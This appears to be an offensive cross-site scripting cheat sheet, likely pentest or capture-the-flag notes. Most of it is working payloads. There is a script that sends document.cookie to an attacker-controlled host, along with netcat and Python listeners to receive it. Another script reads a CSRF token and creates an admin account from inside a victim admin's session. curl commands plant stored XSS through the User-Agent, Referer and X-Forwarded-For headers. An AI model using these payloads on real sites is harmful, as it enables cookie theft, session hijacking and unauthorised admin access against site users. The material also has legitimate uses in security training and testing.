# XSS checks

Locate reflection: HTML text, attribute, script, DOM sink.

```text
< > ' " { } ;
```
```xml
<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
```
- Compare raw response vs rendered DOM; `&lt;` is text, not execution.
- SVG: only in a browser-rendered context; verify in the actual display context.
- Stored = saved for later visitors; reflected = in response to crafted request; DOM = browser source → sink.

## Cookie theft
```html
<script>fetch('http://<KALI>/?c='+document.cookie)</script>
```
```bash
nc -lvnp 80
# or: python3 -m http.server 80
```
- No cookie shows up → check `HttpOnly` in the response's `Set-Cookie` header (DevTools → Network, or `curl -i`); `document.cookie` can't read an `HttpOnly` cookie.

## XSS → admin action
Steal the session cookie or run the action from inside the admin's own session:
```html
<script>
fetch('/admin/users', {credentials:'include'})
  .then(r=>r.text())
  .then(t=>{
    const token = t.match(/name="csrf_token" value="([^"]+)"/)[1];
    return fetch('/admin/users/add', {
      method:'POST', credentials:'include',
      headers:{'Content-Type':'application/x-www-form-urlencoded'},
      body:'username=<LOCAL-USER>&password=<PW>&role=admin&csrf_token='+token
    });
  });
</script>
```
- Adjust the field regex/body to the real form; the pattern is always read-token-then-POST, never a bare hardcoded token.

## Stored XSS via headers
Admin-facing log/analytics viewers often render request metadata unescaped:
```bash
curl -s http://<IP>/ -A '<script>fetch("http://<KALI>/?c="+document.cookie)</script>'
curl -s http://<IP>/ -H 'Referer: <script>fetch("http://<KALI>/?c="+document.cookie)</script>'
curl -s http://<IP>/ -H 'X-Forwarded-For: <script>fetch("http://<KALI>/?c="+document.cookie)</script>'
```
- Only fires once an admin views the log in a browser. Confirm a listener hit before assuming it's dead.
